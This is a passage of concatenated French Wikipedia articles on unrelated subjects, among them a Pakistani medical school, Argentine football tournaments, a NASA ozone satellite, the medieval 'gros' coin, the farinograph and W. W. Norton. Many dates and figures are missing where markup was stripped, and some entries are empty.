Pour entrer dans la Compagnie de Jésus (), il s'exile en Italie et y fait toute sa formation jésuite: noviciat à Novellara (Reggio Emilia), humanités et rhétorique à Bologne, philosophie et théologie à Padoue, où il est ordonné prêtre en 1603. et ne rentre en France qu'après l'édit de Rouen de 1603. Il aurait souhaité rester en Italie, mais le supérieur général, Claudio Acquaviva, l'envoie comme prédicateur à Bordeaux (1604) puis Toulouse. 
Le père Binet est recteur du collège de Rouen (1613-1617), puis supérieur de la maison professe de Paris (1617-1623). C'est durant son séjour à Paris qu'il est en contact avec les personnalités religieuses influentes de son temps: Jeanne-Françoise de Chantal, Marguerite d'Arbouze, Jeanne Chézard, et d'autres. Il fut plus tard également Supérieur Provincial de Champagne (1624-1626), de Lyon (1627-1630) et de Paris (1634-1638).
Binet fut un auteur sprituel prolifique et très diffusé: ses quarante-cinq ouvrages de spiritualité sont réimprimés plusieurs fois de son vivant, et traduits en d'autres langues. Sa "Consolation et réjouissance pour les malades et personnes affligées en forme de dialogue" (Rouen, 1616) fut réimprimée quatorze fois en huit ans. Son "Essai des merveilles de nature et des plus nobles artifices" (Rouen, 1621), ouvrage encyclopédique destiné à nourrir l'éloquence des prédicateurs, connait vingt-quatre éditions jusqu'en 1658. 
Il publie aussi, entre autres, une "Vie d'Ignace de Loyola" et une "Vie de François Xavier" lors de leur canonisation en 1622.

</doc>
<doc id="6807477" url="https://fr.wikipedia.org/wiki?curid=6807477" title="Services Institute of Medical Sciences">
Services Institute of Medical Sciences

LInstitut de services aux sciences médicales (en anglais "Services Institute of Medical Sciences", SIMS, en ourdou ) est une école de médecine située à Lahore, dans la province de Pendjab, au Pakistan.
L' est rattaché à l'école de médecine en qualité d'entité universitaire.
Histoire.
Le a été fondé le par le professeur et docteur en médecine qui en reste l'actuel directeur. Les cours ont débuté à partir du . À l'origine, l'établissement est partie intégrante d'un immeuble relié au "Collège de médecine communautaire de Pendjab" situé au de la "Birdwood Road", à Lahore. La structure est ensuite transférée vers un nouveau campus situé à proximité de l"Institut de cardiologie de Pendjab".
Campus.
Auditorium.
Quatre auditoriums de conférence — auxquels s'ajoutent les salles de cours — gravitent autour d'un bâtiment central. L'enceinte, entièrement climatisée, bénéficie de l'air conditionné et dispose d'une capacité d'accueil de 400 places.
Librairie.
La librairie de l'université, outre qu'elle confère l'accès à la , est reliée par réseau informatisé à plusieurs milliers de contenus scientifiques librement consultables. Elle met également à disposition plus de livres, 78 revues nationales et internationales ainsi qu'une vidéothèque.
Foyer des étudiants.
Les foyers destinés à l'hébergement des étudiants sont en cours de construction. Dans l'attente de la finalisation des travaux, le a conclu des arrangements forfaitaires avec différents hôtels et maisons d'hôtes environnants.
Informatique.
Assisté de techniques informatisées de pointe telles que des microscopes Carl Zeiss à l'usage des étudiants ou de type penta-tête &amp; déca-tête aux fins de présentations publiques et de recherche scientifique, le département de pathologie est labellisé aux normes de certification ISO 9002 et 15142.
Enseignement.
Le pratique et enseigne les disciplines suivantes :
Centre hospitalier universitaire.
Le "" dispose de lits et travaille en étroite collaboration avec le .
Admission.
Chaque année, 190 élèves sont recrutés sur concours. Les conditions d'admissibilité se veulent neutres ; elles sont centralisées par le biais de bulletins non nominatifs afin de garantir la fiabilité du processus ; celui-ci est centralisé par le "" et l'université des sciences de la santé de Lahore. Une souscription optionnelle est également proposée par la .
Cursus universitaire.
L'octroi des diplômes de fin d'étude obtenus à l'issue d'un cursus universitaire au se subdivise en quatre degrés distincts qui sont ensuite entérinés par l'université des sciences de la santé de Lahore :
Subventions et bourses d'études.
Diverses mesures promotionnelles et incitatives sont dispensées au profit d'étudiants méritants. Chaque dotation, définie au cas par cas, s'effectue sous forme de subventions pluridisciplinaires parmi lesquelles figurent des bourses d'études, des bons de trésorerie, voire l'attribution de médailles honorifiques.
Journal.
Le édite un journal spécialisé, "The Esculapio", dont le contenu est consacré à la recherche médicale. Sa diffusion jouit d'une renommée internationale auprès de la communauté scientifique.
Distinction et affiliations.
Le collège est homologué par les instances suivantes :
Vie estudiantine.
Sociétés.
Pour l'heure, aucun syndicat d'étudiants n'a droit de cité dans le cadre du SIMS. Toutefois, une dérogation est accordée au bénéfice de quelques associations et clubs :
Publications.
Le SIMS publie une revue annuelle — "The Simsonian" — rédigée en collégialité par les étudiants de l'université.
Sobriquet.
Les lauréats ayant obtenu leurs diplômes de fin d'études sont élus au grade de « Simsoniens ».

</doc>
<doc id="6807494" url="https://fr.wikipedia.org/wiki?curid=6807494" title="Tetela de Ocampo">
Tetela de Ocampo

Tetela de Ocampo, plus communément appelée Tetela, est un municipio (municipalité mexicaine) de l’État de Puebla.

</doc>
<doc id="6807496" url="https://fr.wikipedia.org/wiki?curid=6807496" title="CdbM">
CdbM



</doc>
<doc id="6807500" url="https://fr.wikipedia.org/wiki?curid=6807500" title="Centre des bords de Marne">
Centre des bords de Marne



</doc>
<doc id="6807503" url="https://fr.wikipedia.org/wiki?curid=6807503" title="L'Arbre sous la mer">
L'Arbre sous la mer

L'Arbre sous la mer est un film français de Philippe Muyl sorti en 1985.
Synopsis.
Mathieu, géologue en visite dans une île grecque, étudie un arbre pétrifié. Il tombe amoureux d'Eléni, une mystérieuse jeune fille. Sauvage, elle disparait parfois dans la mer, la nuit.

</doc>
<doc id="6807508" url="https://fr.wikipedia.org/wiki?curid=6807508" title="Geouffre de la Pradelle">
Geouffre de la Pradelle



</doc>
<doc id="6807514" url="https://fr.wikipedia.org/wiki?curid=6807514" title="Chitulia belcheri">
Chitulia belcheri



</doc>
<doc id="6807515" url="https://fr.wikipedia.org/wiki?curid=6807515" title="Libertaire, Direct, Démocratique">
Libertaire, Direct, Démocratique



</doc>
<doc id="6807518" url="https://fr.wikipedia.org/wiki?curid=6807518" title="The Emperor Jones">
The Emperor Jones

The Emperor Jones est le titre de plusieurs œuvres :

</doc>
<doc id="6807519" url="https://fr.wikipedia.org/wiki?curid=6807519" title="The Emperor Jones (film, 1933)">
The Emperor Jones (film, 1933)

 (titre original) est un film américain réalisé par Dudley Murphy, sorti en 1933.
Il est inscrit au National Film Registry depuis 1999 et conservé à ce titre à la Bibliothèque du Congrès.
Synopsis.
Sur une île imaginaire des Antilles, Brutus Jones s'évade du bagne où il était détenu pour avoir tué un homme. Un concours de circonstances lui permet ensuite de s'auto-proclamer empereur de l'île, avec l'aide du commerçant Smithers. Mais tyrannique et volant ses « sujets », ceux-ci se révoltent et le contraignent à s'enfuir dans la jungle.
Distribution.
Et, parmi les acteurs non crédités :

</doc>
<doc id="6807520" url="https://fr.wikipedia.org/wiki?curid=6807520" title="Château du Mont-Renaud">
Château du Mont-Renaud

Le château du Mont-Renaud est situé sur le territoire de la commune de Passel, dans le département de l'Oise.
Historique.
La chartreuse de Mont-Saint-Louis.
Gérard de Villars, commandeur d'Éterpigny, vendit au début du à Renaud de Rouy, trésorier de Philippe le Bel, le "mont Hérimont". Rouy y installa une communauté de chartreux. Devenue fondation royale par une charte de 1310, elle prit pour patron saint Louis. Quant à elle, la communauté s'appela la chartreuse de Mont-Saint-Louis, puis du Mont-Renaud, du nom du fondateur. 
Au cours des , la chartreuse a fait l'objet d'importants travaux de reconstruction. 
Déclaré bien national au début de la Révolution française, elle fut mise en vente et subit de très importants dommages.
Une paire de statues en provenance de la chartreuse se trouve conservée au musée départemental de l'Oise. On retrouve aussi quelques éléments de boiseries à la cathédrale Notre-Dame de Noyon.
Le château.
Entre 1804 et 1805, alors propriété d'un certain M. Boileau, l'ancienne chartreuse est transformée par l'architecte François-Tranquille Gauché (1766-1846), ancien élève de Charles De Wailly, occupé aussi à l'École polytechnique où il était proche collaborateur de Jean-Nicolas-Louis Durand comme répétiteur d'architecture. Gauché a fait de l'ancienne chartreuse .
En 1818, la chartreuse est remplacée par un château avec colombier et fabrique de jardin. Le château fut modifié et une ferme fut construite vers la fin du .
Du château subsiste l'aile droite, réhabilitée après les combats de la guerre 1914-1918.

</doc>
<doc id="6807526" url="https://fr.wikipedia.org/wiki?curid=6807526" title="Standing for you">
Standing for you

Standing for you est le 17single du groupe Girl Next Door sorti sous le label Avex Trax le au Japon. Il arrive à l'Oricon et reste classé une semaine. "Standing for you" se trouve sur l'album Life of Sound.

</doc>
<doc id="6807539" url="https://fr.wikipedia.org/wiki?curid=6807539" title="Tournoi d'ouverture du championnat d'Argentine de football 2010">
Tournoi d'ouverture du championnat d'Argentine de football 2010

Le tournoi d'ouverture de la saison 2010 du Championnat d'Argentine de football est le premier tournoi semestriel de la du championnat de première division en Argentine. Les vingt équipes sont regroupées au sein d'une poule unique où elles affrontent une fois chacun de leurs adversaires. Il n'y a ni promotion, ni relégation à l'issue de ce tournoi.
C'est le club d'Estudiantes (La Plata) qui remporte le tournoi après avoir terminé en tête du classement final, avec deux points d'avance sur Vélez Sarsfield et treize sur Arsenal. C'est le sixième titre de champion d'Argentine de l'histoire du club, le premier depuis remporté lors du tournoi d'Ouverture 2006.
Qualifications continentales.
Un classement cumulé des tournois de l'année 2010 permet de désigner les quatre clubs engagés en Copa Libertadores : les deux vainqueurs des tournois semestriels puis les deux meilleures équipes non encore qualifiées au classement cumulé. De plus, Estudiantes (La Plata) obtient sa qualification automatique en tant que meilleur club argentin de la Copa Sudamericana 2010 (compétition que le club a d'ailleurs remportée).
Compétition.
Le barème utilisé pour établir le classement est le suivant :
Qualification pour la Copa Libertadores 2011.
Un classement cumulé des deux derniers tournois disputés (Clôture 2010 et Ouverture 2010) permet de distribuer les cinq places attribuées à la fédération argentine. Les deux vainqueurs des tournois sont automatiquement qualifiés pour le premier tour tout comme les deux meilleurs non-qualifiés au classement cumulé. Le CA Independiente, qualifié en tant que meilleur club argentin de la Copa Sudamericana 2010, commence la compétition au tour préliminaire.

</doc>
<doc id="6807541" url="https://fr.wikipedia.org/wiki?curid=6807541" title="Solar Mesosphere Explorer">
Solar Mesosphere Explorer

Solar Mesosphere Explorer, également désigné sous l'appellation SME ou Explorer 64, est un petit satellite scientifique du programme Explorer de la NASA lancé en 1981 destiné à identifier les processus de destruction de la couche d'ozone dans les couches supérieures de l'atmosphère terrestre. La charge utile est constituée de cinq instruments permettant de mesurer l'ozone, la vapeur d'eau et le rayonnement du Soleil.
Contexte.
Solar Mesosphere Explorer est la du programme Explorer de la NASA consacrée aux projets spatiaux scientifiques ayant des coûts relativement faibles et dédié aux investigations scientifiques de l'environnement spatial de la Terre.
Objectifs.
L'objectif principal de SME est de déterminer les processus à l'origine de la création et de la destruction de l'ozone dans les couches supérieures de l'atmosphère terrestre. Les objectifs plus spécifiques sont les suivants :
Caractéristiques techniques.
Le satellite d'une masse totale de a la forme d'un cylindre de de haut pour de diamètre. SME est en rotation à 5 tours par minute. Son axe de rotation est perpendiculaire à sa trajectoire. L'énergie est fournie par des cellules solaires.
Instrumentation scientifique.
Le satellite emporte cinq instruments :
De plus un détecteur de protons solaires est embarqué pour mesurer le flux solaire global dans le spectre des 30-500 MeV.
Déroulement de la mission.
SME est lancé le depuis la base de lancement de Vandenberg par une fusée Delta 2310. Il est placé sur une orbite héliosynchrone de par . Le satellite est désactivé le pour des raisons liées à l'énergie disponible à bord. Il est détruit en rentrant dans l'atmosphère le .
Résultats scientifiques.
SME a mesuré durant sept ans et demi le flux du rayonnement solaire ultraviolet, la densité de l'ozone et la densité d'autres molécules jouant un rôle important dans la chimie de l'ozone. SME a joué un rôle important dans la définition des processus aéronomiques à l'œuvre dans l'évolution de la couche d'ozone.

</doc>
<doc id="6807545" url="https://fr.wikipedia.org/wiki?curid=6807545" title="Château de l'Argentaye">
Château de l'Argentaye

Le château de l'Argentaye est situé sur la commune de Saint-Lormel, dans le département des Côtes-d'Armor.
Historique.
La seigneurie de l'Argentaye est mentionnée dès le .
Le château de l'Argentaye, dont le commanditaire est Marie-Ange Rioust de Largentaye, a été construit en 1840 dans un style néo-classique par l'architecte Hamon, de Saint-Servan. Il présente des similitudes esthétiques avec le presbytère de Corseul construit à la même époque par le même architecte.
Les grille et pavillons d'entrée sont documentés d'un dessin levé en 1836 
La chapelle Saint-René est construite sur les plans de Martial Pelfresne en 1854. 
Le monument fait l’objet d'une inscription au titre des monuments historiques depuis le .
Jardin d'agrément.
Le jardin d'agrément du château de l'Argentaye est planté à partir de 1835.

</doc>
<doc id="6807554" url="https://fr.wikipedia.org/wiki?curid=6807554" title="38e cérémonie des César">
38e cérémonie des César

La des César du cinéma, organisée par l'Académie des arts et techniques du cinéma, s'est déroulée le au théâtre du Châtelet à Paris, et a récompensé les films sortis en 2012. La cérémonie a été présentée par Antoine de Caunes, et présidée par Jamel Debbouze.
Les nominations ont été annoncées le .

</doc>
<doc id="6807556" url="https://fr.wikipedia.org/wiki?curid=6807556" title="Daniel Mongeau">
Daniel Mongeau

Daniel Mongeau est un homme politique français né le à Paris et mort le à Paris, membre du Parti communiste français, maire de Bagnolet, plus jeune élu conseiller général du département et vice-président du Conseil général de la Seine-Saint-Denis. Il est fortement impliqué dans la rénovation urbaine, le développement sportif et culturel de Bagnolet et son département.
Biographie.
Daniel Mongeau est marié, père de deux enfants. Enseignant de profession, il milite au sein du PCF, auquel il adhère dès l'école normale. Il s'installe à Bagnolet en 1961 et devient secrétaire de la cellule communiste dès 1965. 
Il devient en 1970 conseiller général du canton de Bagnolet, le plus jeune du département à l'âge de , et garde son siège pendant , jusque 2011, et deviendra quelques années plus tard premier vice-président du Conseil général de la Seine-Saint-Denis chargé de l'aménagement du territoire et de la culture. Il crée les "Rencontres chorégraphiques internationales de Seine-Saint-Denis" pour mettre en valeur la danse contemporaine. Une autre élue communiste, Josiane Bernard, prend sa succession en 2001. 
De 1970 à 1986, il est maire-adjoint de Jacqueline Chonavel, maire depuis 1959, dans les secteurs de la jeunesse, du sport, du logement, de la culture, de l'information et des finances. 
En 1986, il est élu maire par le conseil municipal succédant à Jacqueline Chonavel. Au bout de 15 ans, en 2001, il se retire de la vie politique : . Durant son mandat, il réalise plusieurs équipements structurants, dont un cinéma, une bibliothèque, puis une médiathèque. 
Il meurt le , à l'âge de , des suites d'une maladie . Il est inhumé au cimetière Raspail de Bagnolet.
Contributions à l'urbanisme et à la culture.
Lors de son mandat de maire, il inaugure des équipements comme la médiathèque, le cinéma, le collège Politzer, la Maison médicalisée pour personnes âgées, le parc départemental Jean Moulin-Les Guilands, le centre commercial Bel'Est et le commissariat de Bagnolet. On doit aussi à Daniel Mongeau le clos à pêches de la rue Charles-Graindorge.
Ce passionné de danse, théâtre et littérature favorise la connaissance culturelle dans son département et au-delà.
« Avant-gardiste dans le domaine culturel », il crée les Rencontres chorégraphiques internationales de Seine-Saint-Denis, axées sur la danse contemporaine et permettent à de grands chorégraphes comme Mark Tompkins à Angelin Preljocaj de s'exprimer.
Il encourage la création à Bagnolet de l'Atelier Théâtre et Musique (ATM), fondé par le compositeur de musique contemporaine Georges Aperghis.
Il est président des Amis du musée de la Résistance nationale (AMRN) qui a initié le festival « La Résistance au Cinéma ».
Appréciations.
Raymond Pronier, dans son livre "Les Municipalités communistes", porte sur le maire-adjoint le regard suivant : 

</doc>
<doc id="6807557" url="https://fr.wikipedia.org/wiki?curid=6807557" title="Village gaulois de Liège">
Village gaulois de Liège

Le Village gaulois de Liège est un marché estival belge de trois semaines mettant à l'honneur les produits traditionnels français et wallons. Il se clôture aux environs du 14 juillet, fête nationale française.
Historique.
Le village gaulois a été créé pour la venue du Tour de France à Liège en 1995.
Depuis lors, le village gaulois est devenu un événement important dans le calendrier des festivités liégeoises qui comporte entre autres le village de Noël, la foire d'octobre ou encore le 15 août en Outremeuse. 
La se déroulera en 2025.
Situation.
Le village gaulois se situe dans le centre de la "cité ardente" au sein du quartier piétonnier. Il se tient sur la place Saint-Paul à l'ombre de la cathédrale éponyme et à côté de la place de la Cathédrale.
Description.
Ce marché estival a pour but de promouvoir les produits du terroir français. Mais les produits liégeois et wallons ne sont pas en reste. Vins, bières, cocktails, magrets, jambons, fromages et autres produits de bouche, le choix est difficile. 
Une cinquantaine de chalets accueillent le public qui peut aussi se restaurer ou déguster sur les terrasses du villages. Des pistes de pétanque sont présentes sur le site et un tournoi y est organisé. Plusieurs manifestations musicales et folkloriques sont organisées pendant les trois semaines que dure le village.

</doc>
<doc id="6807560" url="https://fr.wikipedia.org/wiki?curid=6807560" title="Lie to Me (série télévisée, 2011)">
Lie to Me (série télévisée, 2011)

Naege geojinmar-eul haebwa (coréen : 내게 거짓말을 해봐 ; titre international : "") est une série télévisée sud-coréenne diffusée sur SBS en 2011.

</doc>
<doc id="6807562" url="https://fr.wikipedia.org/wiki?curid=6807562" title="Abolition de l'esclavage au Royaume Uni">
Abolition de l'esclavage au Royaume Uni



</doc>
<doc id="6807572" url="https://fr.wikipedia.org/wiki?curid=6807572" title="Mohamed El Ouafa">
Mohamed El Ouafa



</doc>
<doc id="6807576" url="https://fr.wikipedia.org/wiki?curid=6807576" title="Royaume de Lazique">
Royaume de Lazique

Le royaume de Lazique, souvent simplifié en Lazique, ou encore Égrisi, est un ancien royaume situé dans l'ouest de la Géorgie entre le et le . Il est situé sur une large partie de l'ancien royaume de Colchide, dont il est souvent désigné comme successeur après son intégration dans l'Empire romain. Durant une large partie de son existence, le Lazique était un protectorat de l'Empire byzantin.
Histoire.
Durant la période byzantine, le royaume de Colchide cède la place à l'expression « Lazique ». La période romaine-byzantine est marquée par l'hellénisation des populations côtières en termes de langue, d'économie et de culture. Par exemple, depuis le début du , l'Académie philosophique gréco-latine de Phasis, aujourd'hui Poti, est connue dans tout l'Empire romain. Les populations de l'intérieur montagneux, en revanche, gardent leur langue laze.
Au début du , le "Lazicum" romain reçoit un certain degré d'autonomie, qui à la fin du siècle aboutit à une pleine indépendance, avec la formation d'un nouveau royaume de Lazique, couvrant les régions actuelles de Mingrélie, Adjarie, Gourie et Abkhazie, outre de petites principautés comme celles des Zanes, Svanes, Apsyles et Sanygues.
Au milieu du , le Lazique adopte le christianisme comme religion officielle. Cet événement a été précédé par l'arrivée de l'apôtre Simon le Cananéen, ou "Kananaios" en grec, qui prêche partout en langue laze, et meurt à Suaniri (Lazique occidentale). La première conversion importante au christianisme serait due à Tzath, roi des Lazes, en Colchide, en 520.
Au début du Moyen Âge (), le royaume de Lazique, dans cette région de la mer Noire sur l'actuelle frontière turco-géorgienne, joue un rôle non négligeable de tampon ou de rempart dans les conflits entre l'Empire romain d'Orient (byzantin), désormais de religion chrétienne, et la Perse sassanide. Le roi perse Khosro (531-579) envahit le Lazique en 541, emportant Pétra. L'incorporation du Lazique, avec le royaume d'Abkhazie, dans l'Empire byzantin, est suivie par 50 années de stabilité relative, qui cessent en début du , quand les Arabes apparaissent dans la zone comme une nouvelle puissance régionale.
Souverains.
À partir de la seconde moitié du , les dirigeants lazes sont reconnus comme "Patrices" de Lazique. Parmi eux :

</doc>
<doc id="6807584" url="https://fr.wikipedia.org/wiki?curid=6807584" title="Isaak Markowitsch Khalatnikov">
Isaak Markowitsch Khalatnikov



</doc>
<doc id="6807588" url="https://fr.wikipedia.org/wiki?curid=6807588" title="Garde finlandaise">
Garde finlandaise

La garde finlandaise (en ou officiellement "Henkikaartin 3. Suomen Tarkk’ampujapataljoona" ; en ; en ) a existé de 1817 à 1905 en le Grand-duché de Finlande. Elle était la seule garde finlandaise intégrée dans la garde impériale russe.

</doc>
<doc id="6807591" url="https://fr.wikipedia.org/wiki?curid=6807591" title="Papyrus 52">
Papyrus 52



</doc>
<doc id="6807595" url="https://fr.wikipedia.org/wiki?curid=6807595" title="Tournoi de clôture du championnat d'Argentine de football 2011">
Tournoi de clôture du championnat d'Argentine de football 2011

Le tournoi de clôture de la saison 2011 du Championnat d'Argentine de football est le second tournoi semestriel de la du championnat de première division en Argentine. Les vingt équipes sont regroupées au sein d'une poule unique où elles affrontent une fois chacun de leurs adversaires. Un classement cumulé sur les trois dernières années permet de déterminer les deux équipes reléguées à l'issue du tournoi ainsi que les deux formations engagées en barrage de promotion-relégation, mis en place à partir de cette saison.
C'est le club de Vélez Sarsfield qui remporte le tournoi après avoir terminé en tête du classement final, avec quatre points d'avance sur le Lanús et cinq sur le Godoy Cruz (Mendoza). C'est le huitième titre de champion d'Argentine de l'histoire du club.
La saison s'achève sur un coup de tonnerre : à l'issue des barrages de promotion-relégation qu'il perd face au Belgrano (Córdoba), River Plate, club le plus titré du pays, doit descendre pour la première fois de son histoire en "Primera B". L'accompagnent en deuxième division le Gimnasia y Esgrima (La Plata), pensionnaire de l'élite depuis 26 ans, le Huracán et le Quilmes.
Qualifications continentales.
Le vainqueur du tournoi Clôture obtient son billet pour le premier tour de la Copa Libertadores 2012. En ce qui concerne la Copa Sudamericana 2011, la fédération argentine peut aligner 6 équipes qui sont les six premières du classement cumulé (Ouverture et Clôture).
Compétition.
Le barème utilisé pour établir le classement est le suivant :
Classement cumulé.
Un classement cumulé des tournois Ouverture et Clôture permet de déterminer les équipes qualifiées pour la Copa Sudamericana 2011. Il s'agit des six meilleures équipes de ce classement, plus le CA Independiente, automatiquement qualifié en tant que tenant du titre.
Table de relégation.
Un classement cumulé des trois dernières saisons du championnat permet de déterminer les deux équipes reléguées en "Primera B" et les deux qui doivent disputer un barrage de promotion-relégation. 
Match de classement.
Gimnasia y Esgrima La Plata et le Club Atlético Huracán ont terminé avec la même moyenne de points sur les trois dernières saisons. Un match de barrage est donc organisé entre les deux formations. Le vainqueur gagne le droit de disputer le barrage de promotion-relégation, le vaincu est relégué en "Primera B".

</doc>
<doc id="6807598" url="https://fr.wikipedia.org/wiki?curid=6807598" title="Gros (monnaie)">
Gros (monnaie)

Le gros désigne à partir de la fin du un ensemble très divers de pièces de monnaie d'argent dont le poids et la valeur variaient sur l'ensemble du continent européen, et du pourtour méditerranéen. 
Étymologie et variations des appellations.
Son nom est issu de l'expression latine "grossus Turonensis", « gros de Tours », du nom de la ville située dans le royaume de France, là cette pièce fut frappée vers 1266, désignant littéralement un denier épais ou grand, par comparaison avec la taille standard du denier d'argent ; par ailleurs, le gros était à cette époque une unité de masse valant 3 deniers. Une autre thèse explicative estime que la double croix (en latin "crossus") apparaissant sur l'un des côtés de la pièce, aurait donné, par corruption, le nom "grossus".
Nom que prend la pièce dans d'autres langues que le français :
Histoire monétaire.
La mise en circulation de métaux précieux issus des trésors laïcs ou ecclésiastiques et l'excédent du commerce en lien avec la Péninsule italienne permit la frappe de nouvelles pièces supérieures par leur poids et leur titre aux deniers post-carolingiens : Venise à partir de 1202, suivie par d'autres républiques italiennes (Florence, Gênes, Sienne), émit des gros d'argent bientôt copiés dans toute l'Europe. En France, Saint Louis créa le gros tournois qui valait alors douze deniers. Lancé en 1300, le gros de Prague devient une référence pour toute l'Europe centrale.
Ce format se répand ensuite en Suisse (« demi-gros » en Suisse romande ou « gros pragois » en Suisse orientale). Depuis l'époque moderne, le gros ne fut plus qu'une monnaie de billon, valant trois kreuzers.
En Angleterre, le "groat" désigne une pièce de 4 pence, apparue en 1460 sous le règne d'Édouard IV.
Dès la fin du , la pièce de douze deniers est appelée en France un « douzain », frappée non plus en argent titré mais en billon.
En 1688, l'Empire ottoman réforme sa monnaie et institue la piastre, sur le modèle des Italiens, une grosse monnaie d'argent appelée "kurûş".
En 1723, les mots "groch" ou "grochen" [sic], désignent la « petite monnaie de Pologne ». En 1832, le "groschen" designe la « petite monnaie en usage en Allemagne et en Autriche ».
Son usage perdure en Autriche où il désigne, jusqu'à l'introduction de l'euro, la subdivision du schilling équivalant à 100 "groschen", en Pologne, où le grosz désigne la centième partie du złoty, et en Turquie, où le "kuruş" désigne la centième partie de la livre.

</doc>
<doc id="6807607" url="https://fr.wikipedia.org/wiki?curid=6807607" title="W. W. Norton &amp; Company">
W. W. Norton &amp; Company

W. W. Norton &amp; Company est une maison d’édition américaine indépendante basée à New York. Elle est reconnue pour ses anthologies (en particulier l’anthologie de la littérature anglaise) et ses textes dans les séries "Éditions critiques de Norton", dont le dernier apparaît régulièrement dans le programme des cours de littérature en université. Elle complètement détenue par ses employés depuis le début des années 1960.
Une partie de ses activités est tournée vers la distribution d'ouvrages d'éditeurs indépendants.
Histoire.
W. W. Norton &amp; Company est la plus grosse maison d’édition américaine restée indépendante depuis sa fondation en 1923. C’est la plus vieille et la plus grosse maison d’édition possédée par ses employés des États-Unis, que ce soit dans la publication de fictions, d'essais, de poésie, de manuels scolaire, de livres d’art, de cuisine et de livres professionnels. Ses fondateurs sont William Warder Norton (1891-1945), qui débuta dans l'exportation d'ouvrages, et son épouse Margaret Dows Herter (1894-1985), une traductrice et musicienne. Ils débutèrent leurs activités d'édition en publiant des ouvrages reproduisant les conférences données au People's Institute, hébergé par le Cooper Union for the Advancement of Science and Art (New York). Entre 1942 et 1946, l'entreprise rejoint le programme développé par le Bureau d'information de guerre des États-Unis au sein du Council on Books in Wartime. 
Depuis les années 1950, la ligne éditoriale des manuels universitaires Norton s’est étendue pour inclure des titres en économie, histoire, musique, psychologie, sciences politiques, sociologie et bien d’autres sujets académiques. Plusieurs de ces livres universitaires, parmi lesquels le Norton Shakespeare, La joie de la musique, L’Histoire de la musique occidentale et d’autres, ainsi que les nouvelles éditions ou les éditions revisitées, dans les collections des Anthologies Norton et des séries "Éditions critiques de Norton", sont devenus des best-sellers chez les universitaires. La collection Livres Professionnels Norton a été créée en 1985 avec une série de livres sur la psychothérapie. Cette collection s’est ensuite étendu pour inclure la neurologie, l’éducation, l’architecture et les livres de design. 
Norton a racheté Liveright en 1974 puis Countryman Press, une maison d’édition spécialisée dans le livre touristique, en 1996.
Elle distribue les ouvrages publiés par New Directions Publishing et .
Best-sellers.
La liste de best-sellers de Norton inclut :
Les travaux, eux aussi récompensés par le prix Pulitzer, d'Annette Gordon-Reed et d'Edmund S. Morgan ;
En sciences et en sciences sociales, Norton a publié des best-sellers de différents auteurs comme Mary Roach, des économistes Paul Krugman et Joseph Stiglitz, du paléontologue Stephen Jay Gould, du physicien Richard Feynman, et des historiens Peter Gay, Jonathan Spence, Eric Foner, Christopher Lasch et George F. Kennan.

</doc>
<doc id="6807609" url="https://fr.wikipedia.org/wiki?curid=6807609" title="Bosnie-Herzégovine au Concours Eurovision de la chanson 2012">
Bosnie-Herzégovine au Concours Eurovision de la chanson 2012

La Bosnie-Herzégovine a participé au Concours Eurovision de la chanson 2012 et a sélectionné sa chanson et son artiste via une sélection interne, organisée par le diffuseur bosnien BHRT.
Sélection interne.
Le 9 décembre 2011, BHRT confirme sa participation au Concours Eurovision de la chanson 2012 à Bakou.
Le 15 décembre 2011, BHRT annonce que MayaSar représentera la Bosnie-Herzégovine lors du concours.
Le 15 février 2012, MayaSar annonce que la chanson s’appellera "Korake ti znam". Elle est dévoilée pour la première fois le 15 mars 2012.
À l'Eurovision.
La Bosnie-Herzégovine participe tout d'abord à la deuxième moitié de la seconde demi-finale le 24 mai en passant en entre la Norvège et la Lituanie et se qualifie pour la finale en prenant la avec 77 points.
Lors de la finale du 26 mai, le pays passe en entre la Lituanie et la Russie et finit à la avec 55 points.

</doc>
<doc id="6807612" url="https://fr.wikipedia.org/wiki?curid=6807612" title="Farinographe">
Farinographe

Le farinographe est un appareil permettant de mesurer .
Cet appareil est composé principalement d'un pétrin enregistreur qui va permettre de mesurer le couple de rotation pendant le pétrissage d'une pâte.
Le farinogramme (courbe obtenue pendant la mesure) traduit la valeur de la résistance que la pâte oppose à la rotation des fraseurs en fonction du temps. Cette résistance est appelée consistance et est évaluée en unité de farinographe (UF ou FU). Elle peut aussi être évaluée en unité Brabender (UB).
Histoire.
Le concept du farinographe a été développé par le chimiste agricole hongrois Jenő Hankóczy au début du XXe siècle. En 1905, il a présenté le farinomètre, un appareil permettant de mesurer la force et l'extensibilité du gluten.
En 1912, il avait perfectionné la conception pour inclure l'absorption d'eau et l'évaluation de la consistance de la pâte, principes fondamentaux qui ont jeté les bases des tests rhéologiques modernes.
Alors que le farinographe fut industrialisé et commercialisé en 1928 par Carl Wilhelm Brabender en Allemagne, les innovations antérieures de Hankóczy ont fourni la base scientifique de son développement.
Description.
Cet appareil est constitué : 
Protocole.
Les mesures peuvent être réalisées à partir d'un pétrin contenant ou de farine.
En début de pétrissage, la quantité d'eau distillée à ajouter est déterminée pour obtenir une consistance de 500 UF ou 500 UB. L'opération doit durer 25 secondes au maximum.
La connaissance de l'hydratation de la farine permet, dans un deuxième essai, de conduire un pétrissage complet et d'enregistrer certains paramètres. Si la consistante de départ est constante, elle évolue différemment en fonction des farines au cours du pétrissage.
Interprétations des mesures.
La mesure se fait à une consistance constante de pâte en début d'analyse. Pour cela, il est nécessaire de déterminer préalablement la quantité d'eau nécessaire pour obtenir ce niveau de fermeté.
Si la consistance de départ est constante, elle évoluera différemment en fonction des farines au cours du pétrissage.
On peut donc apprécier sur la courbe : 
Ces valeurs peuvent être corrélées avec le comportement de la pâte au pétrissage en boulangerie. Cette étape étant très importante dans le processus de panification, le farinographe apporte donc des informations intéressantes dans le jugement de la qualité des farines.

</doc>
<doc id="6807617" url="https://fr.wikipedia.org/wiki?curid=6807617" title="Hervé Commère">
Hervé Commère

Hervé Commère est un écrivain français né à Rouen le .
Biographie.
Après des études de lettres, Hervé Commère devient barman, puis patron de bar, tout d'abord dans le département de la Sarthe, puis dans le département de la Manche, et enfin à Rennes.
Il part ensuite à Paris pour se consacrer à sa carrière d'auteur.
Sur le site du festival international du polar de Lyon (Quais du Polar), l'auteur se présente ainsi: J’ai bu toutes sortes d’alcools forts, j’ai travaillé par -15°, écrit deux polars, et aimé plusieurs femmes. Aujourd’hui, je dois écrire trois lignes sur moi, et je ne sais pas quoi dire du tout. J’avoue que ça me laisse pantois.
À l'été 2019, il fait partie des auteurs sollicités par le journal "Elle" pour proposer une nouvelle d'été.
Après sept livres classés au rayon policier, il passe à la littérature générale en 2022 avec "Les Intrépides".
Prix et distinctions littéraires.
